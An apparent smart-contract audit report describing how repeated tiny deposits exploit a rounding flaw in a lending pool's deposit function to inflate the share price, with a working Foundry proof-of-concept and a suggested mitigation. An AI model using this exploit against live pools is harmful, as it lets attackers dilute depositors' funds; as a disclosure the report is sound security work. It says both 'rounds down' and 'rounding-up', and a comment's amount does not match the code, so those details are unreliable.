# An Attacker Can Exploit the Deposit Function to Inflate Share Prices

### Summary

The flaw in the `deposit` function will cause significant financial disadvantage for new depositors as an attacker will exploit the rounding error in share calculations to inflate the share price. The flawed calculation will cause an increase in the share price, which means new depositors will receive fewer shares for their deposits.

### Root Cause

In `Pool.sol:322`, the deposit function rounds down when calculating the number of shares to issue, which causes an increase in the share price.

### Internal pre-conditions

1. `totalDepositAssets` of the pool needs to be small enough to make rounding errors significant.

### External pre-conditions

No external pre-conditions are required.

### Attack Path

1. An attacker deposits assets into the pool in multiple small transactions.
2. Each deposit triggers the rounding-up mechanism, slightly increasing `totalDepositShares` without a proportional increase in `totalDepositAssets`.
3. Over several iterations, the share price becomes inflated due to the increased `totalDepositAssets` and relatively smaller increase in `totalDepositShares`.
4. After the attack, new depositors receive far fewer shares for their assets than pre-attack conditions.

### Impact

1. The share price of the pool becomes significantly inflated.
2. New depositors receive significantly fewer shares for their assets compared to the pre-attack conditions.
3. The protocolâ€™s integrity is compromised, leading to a loss of trust and fairness.

### PoC

```solidity
    function test() public {
        uint assets;
        uint shares;
        address attacker = makeAddr("attacker");

        // the user deposits 10000 assets to linearRatePool
        vm.startPrank(user);
        asset1.mint(user, 1000);
        asset1.approve(address(pool), 1000);

        pool.deposit(linearRatePool, 1000, user);
        vm.stopPrank();

        // totalDepositAssets is 1000 and totalDepositShares is 1000. the share price is 1.
        (,,,,,,,,, assets, shares) = pool.poolDataFor(linearRatePool);
        assertEq(assets, 1000);
        assertEq(shares, 1000);

        // the user2 borrows 100 assets from pool.
        vm.prank(registry.addressFor(SENTIMENT_POSITION_MANAGER_KEY));
        pool.borrow(linearRatePool, user2, 100);

        uint256 time = block.timestamp + 1 days;
        vm.warp(time + 86_400 * 7);
        vm.roll(block.number + ((86_400 * 7) / 2));
        pool.accrue(linearRatePool);

        // totalDepositAssets is 1003 and totalDepositShares is 1000 after 7 days. the share price is 1.003.
        (,,,,,,,,, assets, shares) = pool.poolDataFor(linearRatePool);
        assertEq(assets, 1003);
        assertEq(shares, 1000);

        // the attacker deposit 1500 times per 2 asset
        vm.startPrank(attacker);
        asset1.mint(attacker, 10000);
        asset1.approve(address(pool), 10000);

        for(uint i = 0; i < 1500; i++) {
            pool.deposit(linearRatePool, 2, attacker);
        }
        vm.stopPrank();

        // totalDepositAssets is 4003 and totalDepositShares is 2500. the share price is 1.6012.
        (,,,,,,,,, assets, shares) = pool.poolDataFor(linearRatePool);
        assertEq(assets, 4003);
        assertEq(shares, 2500);
    }
```

### Mitigation

To mitigate this issue, consider implementing more precise rounding mechanisms or adding limits to the amount of assets that can be deposited in a single transaction. This could help reduce the impact of the rounding error and prevent attackers from inflating the share price.
